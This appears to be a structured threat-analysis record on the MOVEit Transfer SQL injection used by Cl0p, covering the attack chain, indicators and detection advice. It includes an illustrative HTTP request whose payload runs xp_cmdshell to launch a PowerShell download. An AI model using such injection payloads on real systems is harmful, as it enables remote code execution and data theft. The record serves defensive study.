package_info.package_versions: unknown, but exploited since at least July 2021 through 2023
package_info.why_malicious: A zero-day vulnerability in MOVEit Transfer was exploited by the Cl0p ransomware group for at least two years, enabling unauthorized remote code execution (RCE) and data exfiltration from high-profile organizations, including federal agencies. The flaw allowed attackers to perform SQL injection, leading to full compromise of the file transfer platform and its sensitive data.

execution_context.file_location: web application endpoint (MOVEit Transfer web interface)

malicious_snippets.code_snippet:
Attacker sends specially crafted SQL injection payload via HTTP POST/GET to vulnerable MOVEit endpoint, e.g.:

POST /moveitapi/endpoint HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

param1=1'; EXEC xp_cmdshell('powershell -c "Invoke-WebRequest ..."');--
malicious_snippets.code_behavior: At runtime, the code injects SQL commands into a vulnerable web endpoint, which are executed by the backend database, enabling arbitrary command execution (such as launching PowerShell to download and run malware), resulting in remote code execution and data exfiltration.

malice_analysis.why_suspicious: SQL injection enabling arbitrary command execution is a classic and highly dangerous attack vector, especially in a file transfer platform handling sensitive data.
malice_analysis.violated_expectations: Normal web application endpoints should sanitize and parameterize all user input, preventing direct execution of SQL or OS commands.
malice_analysis.similar_legitimate_use: No legitimate use for unsanitized SQL execution from user input; legitimate admin actions would be strictly authenticated and audited.
key_indicators: SQL injection payloads in HTTP requests
Use of xp_cmdshell or similar database command execution features
Unexpected PowerShell or shell command execution from database context

attack_chain.action: Attacker discovers and targets vulnerable MOVEit Transfer endpoint with SQL injection payload.
attack_chain.leads_to: Remote code execution on the MOVEit server

attack_chain.action: Injected SQL enables execution of arbitrary OS commands (e.g., PowerShell), allowing attacker to deploy malware or exfiltrate data.
attack_chain.leads_to: Data exfiltration, ransomware deployment, or further lateral movement

behavioral_signatures: Unexpected SQL commands executed via web application endpoints
Database process spawning OS shell or PowerShell processes
Unusual outbound network connections from MOVEit servers
file_indicators: Web application logs showing SQL injection patterns
Unexpected scripts or binaries dropped in MOVEit server directories
network_indicators: Outbound connections to known Cl0p infrastructure or suspicious IPs
Large data transfers from MOVEit servers to external destinations
detection_knowledge.how_to_detect: Monitor web application logs for SQL injection attempts, especially those containing xp_cmdshell or similar commands. Alert on database processes spawning OS shells or PowerShell. Watch for unusual outbound network activity from MOVEit servers, especially large data transfers or connections to known malicious infrastructure. Regularly audit file system for unexpected scripts or binaries.
